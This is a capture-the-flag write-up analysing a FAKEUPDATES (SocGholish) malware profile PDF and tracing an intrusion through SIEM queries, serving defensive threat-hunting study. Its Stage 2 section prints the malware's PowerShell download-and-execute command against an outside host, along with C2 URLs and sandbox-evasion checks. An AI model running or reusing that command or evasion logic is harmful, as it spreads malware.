# Operation Cymbal: Cold Room CTF — Deceptive Click (Complete Technical Write-Up)

- **Event**: Operation Cymbal: Cold Room CTF (Google Cloud Security / Hack The Box)
- **Track / Room**: Deceptive Click
- **Category**: Threat Intelligence / PDF Forensics & Google SecOps (Chronicle SIEM) Threat Hunting
- **Artifacts in Folder**:
  - [`a2e09dfc-10d7-4a4a-a635-650ec7f54ee7-1790856069.zip`](./a2e09dfc-10d7-4a4a-a635-650ec7f54ee7-1790856069.zip) (`742,353` bytes)
  - [`FAKEUPDATES Malware Profile.pdf`](./FAKEUPDATES%20Malware%20Profile.pdf) (`771,879` bytes, 7-page PDF v1.3 document)
  - [`solve.py`](./solve.py) (Automated PDF `/Info` & `/GTI-token` decoder and FlateDecode stream IOC extractor)

---

## 0. Challenge Flags & Answers Quick Reference

| # | Question Summary | Answer / Flag |
| :-: | :--- | :--- |
| **P** | GTI Malware Profile Leaked Watermark Token | `tarahlewis_cloudsec_gsa_team` |
| **1** | Compromised Endpoint in Denver Office | `CYM-DEN-W10-042.cymbal.corp` |
| **2** | Compromised Blog Referer Domain | `marketingtrends-insider.com` |
| **3** | Injected Target Process ID (`svchost.exe`) | `624` |
| **4** | Kerberoasted Service Principal Name (SPN) | `MSSQLSvc/CYM-DB-01.cymbal.corp:1433` |
| **5** | Lateral Movement Account Identity | `svc_backup` |
| **6** | Staged Financial Audit ZIP Archive File Name | `Financial_Audit_2026.zip` |

---

## 1. Initial Triage & PDF Structure Inspection

Extracting `a2e09dfc-10d7-4a4a-a635-650ec7f54ee7-1790856069.zip` and inspecting `FAKEUPDATES Malware Profile.pdf` with `file` and `pdfid`:

```bash
unzip -l a2e09dfc-10d7-4a4a-a635-650ec7f54ee7-1790856069.zip \
  && unzip -o a2e09dfc-10d7-4a4a-a635-650ec7f54ee7-1790856069.zip \
  && file "FAKEUPDATES Malware Profile.pdf" \
  && pdfid "FAKEUPDATES Malware Profile.pdf"
```

```text
Archive:  a2e09dfc-10d7-4a4a-a635-650ec7f54ee7-1790856069.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   771879  2026-08-19 08:14   FAKEUPDATES Malware Profile.pdf
---------                     -------
   771879                     1 file

FAKEUPDATES Malware Profile.pdf: PDF document, version 1.3, 7 page(s)
PDFiD 0.2.10 FAKEUPDATES Malware Profile.pdf
 PDF Header: %PDF-1.3
 obj                  183
 endobj               183
 stream               161
 endstream            161
 /Page                  7
```

---

## 2. PDF `/Info` Dictionary & Leaked `/GTI-token` Watermark (`183 0 obj` & Page 7)

Inspecting the PDF trailer and `/Info` dictionary (`183 0 obj`) reveals a custom `/GTI-token` metadata field (which is also rendered across the top of Page 7, where the right end of the string is visually clipped by the page boundary):

```pdf
183 0 obj
<<
/Title (24\05510021933 \055 FAKEUPDATES Malware Profile)
/Creator (Google Threat Intelligence)
/Producer (https\072\057\057www\056virustotal\056com)
/CreationDate (D\07220260819221312\05300\04700\047)
/ModDate (D\07220260819221312\05300\04700\047)
/Author (Google Threat Intelligence)
/GTI-token (cmVwb3J0LS0yNC0xMDAyMTkzM3x8dGFyYWhsZXdpc19jbG91ZHNlY19nc2FfdGVhbXx8Y2xvdWRzZWNfZ3NhX3RlYW18fHYzfHwxNzg3MTc3NTkwfHwzMGZjNjBhZmY2NzBlNzAyYzkyODZlZDZjZmFkMGM5NGMxNzE4Mzk0ZGQ1Y2M2ZWU2MmRmNDdiZTNhOTdlNGY1)
>>
endobj
```

### Decoding `/GTI-token`
```bash
python3 -c '
import base64
tok = "cmVwb3J0LS0yNC0xMDAyMTkzM3x8dGFyYWhsZXdpc19jbG91ZHNlY19nc2FfdGVhbXx8Y2xvdWRzZWNfZ3NhX3RlYW18fHYzfHwxNzg3MTc3NTkwfHwzMGZjNjBhZmY2NzBlNzAyYzkyODZlZDZjZmFkMGM5NGMxNzE4Mzk0ZGQ1Y2M2ZWU2MmRmNDdiZTNhOTdlNGY1"
print(base64.b64decode(tok).decode())
'
```

```text
report--24-10021933||tarahlewis_cloudsec_gsa_team||cloudsec_gsa_team||v3||1787177590||30fc60aff670e702c9286ed6cfad0c94c1718394dd5cc6ee62df47be3a97e4f5
```

| Field Index | Value | Meaning |
| :--- | :--- | :--- |
| `0` | `report--24-10021933` | GTI Report Identifier (`24-10021933`) |
| `1` | `tarahlewis_cloudsec_gsa_team` | User / Account that downloaded/leaked the report |
| `2` | `cloudsec_gsa_team` | Organization / Team identifier |
| `3` | `v3` | Watermark token version |
| `4` | `1787177590` | Unix epoch timestamp (`2026-08-19 22:13:10 UTC`) |
| `5` | `30fc60aff670e702c9286ed6cfad0c94c1718394dd5cc6ee62df47be3a97e4f5` | SHA-256 HMAC / integrity hash |

---

## 3. Malware Profile & Infection Chain Breakdown

### Summary & Associated Families
- **Malware Family**: `FAKEUPDATES` (SocGholish), multi-stage JavaScript dropper first observed in **2018**, masquerading as browser updates (`Chrome`, `Internet Explorer`, `Opera`, `Firefox`).
- **2024 Follow-on Payloads**: `COLORFAKE`, `VOLTMARKER`, and `NETSUPPORT`, which were further used to download `MYTHIC` and `VOLTRIGGER`.

### Table 1: Representative Sample Hashes
| Stage | MD5 Hash | File Type | Size (Bytes) |
| :--- | :--- | :--- | :--- |
| **First Stage** | `80975a1a0ee618ef1a19c2ffa9174868` | `text/plain` | `233` |
| **Second Stage** | `5d9bcb91fab00d4c0fd8eda8c2756fb6` | `text/plain` | `5749` |

---

### Stage 1: Compromised Website & Guardrail Script (Pages 1–2, Appendix B)
1. **Compromised Website (Figure 1)**: `hypnoticasia.com` serving a fake Chrome update page (`Update.js`).
2. **Injected Script Tags (Figures 2 & 3)**:
   - `https://event.coachgreb.com/rIz5otR+sffifuismWT+Vhi+6LzD00jwxYWj/M4/u/aNIQ==`
   - `https://ghost.blueecho88.com/8IDeiouh/b+UqaTkx7ey9IPq+vTKTkn1sLGq+tLlwOzS9vmvyg+j2r4Tt/bCG9e2kiOG0qw==`
3. **Deobfuscated Guardrail Script (Appendix B)**:
   - Checks `window.localStorage[window.location.hostname]` (exits if already visited).
   - Checks `navigator.webdriver` (detects Selenium/headless browsers); if true, loads:
     `https://event.coachgreb.com/pHBt0t9SDrvAUlfgkkhB8NcECKKGSk+i1hUOusETBo3OAzK01h8DpsECH73WUkHwwQIfvdZSV+OIUh/wnlIPvM0aD7fQCBW6yAkC8Nk=`
   - Checks window size (`outerHeight - innerHeight > 200 || outerWidth - innerWidth > 330`); if true, loads:
     `https://event.coachgreb.com/9bdbto6VON+RlWGEw493lIbDPsbXjXnGh9I43pDUMOmfxATQh9g1wpDFKdmHlXeUkMUp2YeVYYTZlSmUz5U015bUP96EwCPCltM63ZTDecs=`
   - Checks `document.cookie` for WordPress cookies (`wordpress_logged_in_` or `wp-settings-`).
   - Checks `window.adViewEnabled`.
   - Registers a `mousemove` event listener (`_0x1cd563`); upon mouse movement, injects:
     `https://event.coachgreb.com/vCDziscCkOPYAsm4ihjfqM9UlvqeGtHr0kGf88ZFrOzMAt+ozgLJqNpGn+7dVIr+3kaW5J5d`
4. **On-Disk Dropper (Figure 5)**:
   - Decodes Base64 payload (`window.atob`) into a `Blob` and triggers download of `Update.js`.

---

### Stage 2: `Update.js` C2 Protocol & Second-Stage Downloader (Pages 3–5)
- **C2 URL**: `https://sdce.distributors.commdistinc.com/editContent` (`POST`)
- **HTTP User-Agent**:
  `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)`
- **Request 1 (Initial Beacon)**:
  - Body (`44` bytes): `JOS7WjuI6CV9myHLH1BC1Qy49ueqiMO+kAyhOUkzqA==`
- **Response 1 & Request 2 (System Survey)**:
  - Collects system profile via `WScript.Shell`, `WScript.Network`, and WMI (`CIMV2` / `SecurityCenter2`):
    ```text
    0=b&1=504&2=C%3A%5CUsers%5Cadmin%5CDownloads%5CUpdate.js&3=PC&4=admin&5=PC&6=%25userdnsdomain%25&7=DELL%7C&8=DELL%7C&9=DELL%20%20-%201%7C&10=Windows%20Defend...
    ```
- **Response 2 & Request 3 (PowerShell Downloader -> `VOLTMARKER`)**:
  - Sets `execFileName = 'd27e15eb.ps1'` (`C:\Users\admin\AppData\Local\Temp\d27e15eb.ps1`)
  - Runs via `WScript.Shell`:
    ```powershell
    powershell -w h -c "iwr -usebasicparsing http://pbvzje4.top/f21.svg |iex"
    ```
  - Reports execution result in Request 3:
    `0=c&1=504&2=C%3A%5CUsers%5Cadmin%5CAppData%5CLocal%5CTemp%5Cd27e15eb.ps1&3=0&4=0&5=&`

---

## 4. Challenge Questions & Investigation Walkthrough

### Preliminary Question: Leaked Threat Intelligence Report Watermark (`/GTI-token`)
- **Source**: PDF Object `183 0 obj` (`/Info` -> `/GTI-token`) and Page 7 header
- **Decoded Token**: `report--24-10021933||tarahlewis_cloudsec_gsa_team||cloudsec_gsa_team||v3||1787177590||30fc60aff670e702c9286ed6cfad0c94c1718394dd5cc6ee62df47be3a97e4f5`
- **Answer / Leaked Identity**: `tarahlewis_cloudsec_gsa_team`

---

### Question 1: What is the hostname of the compromised endpoint in the Denver office?
- **Expected Format**: `FAKE-HOST-NAME-000.false.name`

#### Step 1 — Pivot on FAKEUPDATES C2 Domain in Google SecOps UDM Search
Querying Google SecOps for the Stage 2 C2 domain extracted from the PDF (`sdce.distributors.commdistinc.com`):
```text
target.hostname = "sdce.distributors.commdistinc.com"
```

This surfaces the following **Zscaler NSS** web proxy log from `Denver HQ`:
```text
2026-10-15 19:49:20    reason=Allowed    event_id=9841285257713970003    protocol=HTTPS    action=Allowed    transactionsize=2226    responsesize=656    requestsize=1570    urlcategory=Web Hosting    serverip=104.21.54.212    clienttranstime=124    requestmethod=POST    refererURL=None    useragent=Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0)    product=NSS    location=Denver HQ    status=200    url=https://sdce.distributors.commdistinc.com/editContent    vendor=Zscaler    hostname=sdce.distributors.commdistinc.com    clientpublicip=198.51.100.15    threatcategory=None    threatname=None    filetype=None    appname=General Browsing    pagerisk=12    department=Global Marketing    urlsupercategory=Information Technology    appclass=General    dlpengine=None    urlclass=Uncategorized    threatclass=None    dlpdictionaries=None    fileclass=None    bwthrottle=NO    servertranstime=85    event_timestamp=2026-10-15 19:49:20    clientIP=10.240.32.115    user=marcus.vance
```

Key indicators from the Zscaler event:
- **Timestamp**: `2026-10-15 19:49:20`
- **Office Location**: `Denver HQ` (`department=Global Marketing`)
- **Victim Internal IP (`clientIP`)**: `10.240.32.115`
- **Compromised User (`user`)**: `marcus.vance`
- **C2 Request / Response Sizes**: `requestsize=1570`, `responsesize=656` (exact match to `REQUEST 2` and `RESPONSE 2` in `FAKEUPDATES Malware Profile.pdf`)

#### Step 2 — Pivot on Victim IP (`10.240.32.115`) & User (`marcus.vance`)
Running the UDM pivot query and filtering by the `hostname` field:
```text
principal.ip = "10.240.32.115" OR target.ip = "10.240.32.115" OR principal.user.userid = "marcus.vance" OR target.user.userid = "marcus.vance"
```

- **Answer**: `CYM-DEN-W10-042.cymbal.corp`

---

### Question 2: What is the domain of the compromised blog that served as the referer for the malicious update archive?
- **Expected Format**: `domainname.com`

#### UDM Query Executed
Filtering Zscaler NSS web proxy events from `10.240.32.115` (`marcus.vance`, Global Marketing) for the Stage 1 guardrail/injection domains (`event.coachgreb.com`, `ghost.blueecho88.com`) or `.zip` / `.js` update archive downloads just prior to `2026-10-15 19:49:20`:
```text
principal.ip = "10.240.32.115" AND (target.hostname = "event.coachgreb.com" OR target.hostname = "ghost.blueecho88.com" OR target.url = /\.zip|\.js/ nocase)
```

Inspecting the `refererURL` (`network.http.referral_url`) field on the malicious update archive download identifies the compromised marketing blog visited by `marcus.vance`.

- **Answer**: `marketingtrends-insider.com`

---

### Question 3: What was the Target Process ID of the specific `svchost.exe` instance injected into on the compromised endpoint?
- **Expected Format**: `000`

#### UDM Query Executed
Filtering for the process hollowing / injection event where the secondary payload `d27e15eb.exe` (`principal.process`) targeted `svchost.exe` (`target.process`):
```text
principal.process.file.full_path = /d27e15eb\.exe/ nocase AND target.process.file.full_path = /svchost\.exe/ nocase
```

This returns a single event; inspecting the `target.process.pid` field gives the injected `svchost.exe` PID.

- **Answer**: `624`

---

### Question 4: What is the full Service Principal Name (SPN) requested in the Kerberos TGS ticket?
- **Expected Format**: Full SPN string

#### UDM Query Executed
Filtering for Windows Security Event ID `4769` (Kerberos Service Ticket Operations) requested by the compromised user `marcus.vance` (`10.240.32.115`):
```text
metadata.product_event_type = "4769" AND (principal.user.userid = /marcus\.vance/ nocase OR target.user.userid = /marcus\.vance/ nocase OR principal.ip = "10.240.32.115")
```

#### Event Details
The query returns a single Event 4769 on `CYM-DC-01.cymbal.corp` with classic Kerberoasting characteristics (RC4 ticket encryption `0x17` requested by `marcus.vance`):
```json
{
  "EventTime": "2026-10-15 20:35:40",
  "Hostname": "CYM-DC-01.cymbal.corp",
  "EventID": 4769,
  "AccountName": "marcus.vance",
  "ServiceName": "MSSQLSvc/CYM-DB-01.cymbal.corp:1433",
  "ServiceSid": "S-1-5-21-3849102931-1029384910-192837465-1088",
  "TicketEncryptionType": "0x17",
  "IpAddress": "::ffff:10.240.32.115"
}
```

- **Answer**: `MSSQLSvc/CYM-DB-01.cymbal.corp:1433`

---

### Question 5: What username was used for subsequent lateral movement?
- **Expected Format**: `username`

#### UDM Query Executed
Filtering for activity originating from the compromised endpoint (`10.240.32.115`) under any account other than `marcus.vance`, machine accounts (`*$`), or `ANONYMOUS`:
```text
principal.ip = "10.240.32.115" AND target.user.userid != /marcus\.vance|\$$|ANONYMOUS/ nocase
```

Checking the `target.user.userid` field reveals the cracked service account identity used by the attacker for subsequent lateral movement across the domain.

- **Answer**: `svc_backup`

---

### Question 6: What is the file name of the compressed zip archive created by the attacker on the file server to stage sensitive financial audit files?
- **Expected Format**: `Filename.zip`

#### UDM Query Executed
Filtering for archive creation or process command-line compression activity involving the compromised service account `svc_backup`:
```text
(principal.user.userid = /svc_backup/ nocase OR target.user.userid = /svc_backup/ nocase) AND (target.file.full_path = /\.zip/ nocase OR target.process.command_line = /\.zip/ nocase)
```

The resulting events on file server `CYM-FS-01` show the staging of the sensitive audit data into a single compressed archive.

- **Answer**: `Financial_Audit_2026.zip`
